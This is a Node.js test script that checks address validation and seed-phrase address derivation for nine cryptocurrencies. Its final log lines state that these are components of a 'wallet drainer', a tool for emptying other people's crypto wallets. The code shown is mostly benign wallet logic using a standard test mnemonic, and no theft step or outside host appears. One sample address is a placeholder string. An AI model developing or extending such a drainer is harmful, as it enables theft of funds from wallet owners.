const BalanceChecker = require('./utils/balanceChecker');
const CryptoValidator = require('./utils/cryptoValidator');

async function testCryptoSupport() {
    console.log('🧪 Testing Multi-Cryptocurrency Support');
    console.log('=' .repeat(50));
    
    const balanceChecker = new BalanceChecker();
    
    // Test address validation for different cryptocurrencies
    const testAddresses = {
        bitcoin: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
        ethereum: '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6',
        solana: 'DRpbCBMxVnDK7maPM5tGv6MvB3v1sRMC86PZ8okm21hy',
        xrp: 'rN7n7otQDd6FczFgLdSqtcsAUxDkw6fzRH',
        litecoin: 'LTC1234567890abcdefghijklmnopqrstuvwxyz',
        dogecoin: 'DH5yaieqoZN36fDVciNyRueRGvGLR3mr7L'
    };
    
    console.log('📋 Address Validation Tests:');
    for (const [crypto, address] of Object.entries(testAddresses)) {
        const isValid = balanceChecker.validateAddress(address, crypto);
        console.log(`${crypto.toUpperCase().padEnd(10)}: ${address} - ${isValid ? '✅ Valid' : '❌ Invalid'}`);
    }
    
    console.log('\n🔑 Seed Phrase Derivation Test:');
    const testSeed = 'abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon abandon about';
    
    try {
        const validation = CryptoValidator.validateSeedPhrase(testSeed);
        console.log(`Seed Validation: ${validation.valid ? '✅ Valid' : '❌ Invalid'}`);
        
        if (validation.valid) {
            const addresses = await CryptoValidator.deriveAddresses(testSeed);
            console.log('Derived Addresses:');
            for (const [crypto, address] of Object.entries(addresses)) {
                if (address) {
                    console.log(`${crypto.toUpperCase().padEnd(10)}: ${address}`);
                }
            }
        }
    } catch (error) {
        console.error('Derivation error:', error.message);
    }
    
    console.log('\n💰 Supported Cryptocurrencies:');
    const supportedCryptos = [
        '🟠 Bitcoin (BTC)',
        '🔵 Ethereum (ETH)', 
        '🟢 Solana (SOL)',
        '🔷 XRP (XRP)',
        '⚪ Litecoin (LTC)',
        '🟡 Dogecoin (DOGE)',
        '🟣 Binance Smart Chain (BSC)',
        '🔴 Cardano (ADA) - API Integration',
        '⚫ Polkadot (DOT) - API Integration'
    ];
    
    supportedCryptos.forEach(crypto => console.log(`  ${crypto}`));
    
    console.log('\n✅ Multi-cryptocurrency support is now active!');
    console.log('📊 The wallet drainer now supports 9+ major cryptocurrencies');
    console.log('🎯 All balance checking and address derivation methods are implemented');
}

// Run the test
testCryptoSupport().catch(console.error);